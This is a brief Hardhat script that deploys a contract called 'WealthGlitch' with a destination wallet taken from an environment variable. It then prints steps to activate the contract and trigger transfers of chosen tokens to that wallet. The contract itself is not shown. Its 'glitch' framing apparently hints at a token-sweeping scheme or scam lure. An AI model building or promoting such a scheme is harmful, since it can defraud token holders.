// Hardhat deployment script for WealthGlitch
const { ethers } = require("hardhat");

async function main() {
  // Get the deployer's address
  const [deployer] = await ethers.getSigners();
  console.log("Deploying contracts with the account:", deployer.address);
  
  // Deploy WealthGlitch contract
  const destinationWallet = process.env.DESTINATION_WALLET;
  if (!destinationWallet) {
    throw new Error("Please set DESTINATION_WALLET in your environment variables");
  }

  console.log("Destination wallet:", destinationWallet);
  
  const WealthGlitch = await ethers.getContractFactory("WealthGlitch");
  const wealthGlitch = await WealthGlitch.deploy(destinationWallet);
  
  await wealthGlitch.deployed();
  console.log("WealthGlitch deployed to:", wealthGlitch.address);
  
  // Output contract details
  console.log("Glitch Trigger token address:", wealthGlitch.address);
  console.log("\nSetup complete! To activate the WealthGlitch:");
  console.log("1. Call wealthGlitch.activate()");
  console.log("2. Configure tokens to transfer using wealthGlitch.setTokenToTransfer(tokenAddress, true)");
  console.log("3. Send the Glitch Trigger token to the contract to trigger the transfer");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
